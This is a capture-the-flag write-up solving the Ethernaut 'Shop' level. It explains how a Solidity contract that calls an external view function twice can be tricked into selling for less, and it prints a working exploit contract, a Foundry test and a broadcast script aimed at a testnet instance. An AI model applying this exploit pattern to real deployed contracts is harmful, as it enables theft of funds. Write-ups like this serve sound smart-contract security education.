## 👾 21. Shop

<br>


### tl; dr

<br>

* in this challenge we explore restrictions of `view` functions through an `interface`, similarly to level `11` for `Elevator`.
  - now, the goal is to find a way to buy items from a `Shop` contract for a lower price when compared to sold items.

<br>

* remember that a `view` function **[cannot modify the state of the contract](https://docs.soliditylang.org/en/v0.8.15/contracts.html#view-functions)**. 
  - for instance, it cannot write to state variables, create other contracts, emit events, send ether with `call()`, use any low-level calls, use `selfdestruct()`, call functions that `pure` or `view`, or use inline assembly with certain opcodes.


<br>
  
<p align="center">
<img width="300" src="https://github.com/go-outside-labs/ethernaut-foundry-detailed-solutions-sol/assets/138340846/2032b1e7-77f6-4481-8037-54031ebcb435">
</p>



<br>

```solidity
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```


<br>

---

### discussion

<br>

* the first part of this contract is the `interface Buyer` that defines as `external view` function, `price()`, representing the amount of `wei` a `Buyer` must pay:
<br>

```solidity
interface Buyer {
  function price() external view returns (uint);
}
```

<br>

* then, in the `Shop` contract, we have two state variables:

<br>

```solidity
uint public price = 100;
bool public isSold;
```

<br>

* and a `public` function `buy()`, where the `price()` is being called twice. 
  - this is our vulnerability, as one should never trust external inputs (*e.g.,* coming from the `interface` implementation):

<br>

```solidity
function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
}
```

<br>

* in other words, `Shop` expects `Buyer` to return the price it is willing to pay to buy the item, believing that the price would not change the second time it is called, as it is a `view` function.
<br>

* we will use this as our exploit, querying the value of `isSold()` and returning a different result based on our needs:
  - the first time `price()` is called, it returns `>100` to enter the loop.
  - then, the second time, it can return anything lower.


----

### solution

<br>

* we craft the following exploit at `src/21/ShopExploit.sol`:

<br>

```solidity
contract ShopExploit is Buyer {

    Shop private level;

    function price() external view returns (uint256) {
        return level.isSold() ? 0 : 1337;
    }

    function run(Shop _level) public {
        level = _level;
        level.buy();
    }
}
```


<br>

* check `test/21.Shop.t.sol` for testing this solution::

<br>

```solidity
contract ShopTest is Test {

    Shop public level = new Shop();

    address instance = payable(vm.addr(0x10053)); 
    address hacker = vm.addr(0x1337); 

    function setUp() public {
        vm.prank(instance);
    }

    function testShopHack() public {

        vm.startPrank(hacker);
        console.log(level.isSold());
        ShopExploit exploit = new ShopExploit();
        exploit.run(level);
        assert(level.isSold());
        vm.stopPrank();
        
    }
}
```

<br>

* running:

<br>

```shell
> forge test --match-contract ShopTest -vvvv    
```



<br>

* then, submit the solution with `script/21/Shop.s.sol`:

<br>

```solidity
contract Exploit is Script {
        
    address instance = vm.envAddress("INSTANCE_LEVEL21");  
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));   
    Shop level = Shop(instance); 
    
    function run() external {
        vm.startBroadcast(hacker);
        ShopExploit exploit = new ShopExploit();
        exploit.run(level);
        vm.stopBroadcast();
    }
}

```

<br>

* by running:

<br>

```shell
> forge script ./script/21/Shop.s.sol --broadcast -vvvv --rpc-url sepolia
```



<br>

----


### pwned...


<br>

  
<p align="center">
<img width="400" src="https://github.com/go-outside-labs/ethernaut-foundry-writeups-sol/assets/138340846/ba3f82a3-00c0-43f9-a423-588d7f6e4c70">
</p>



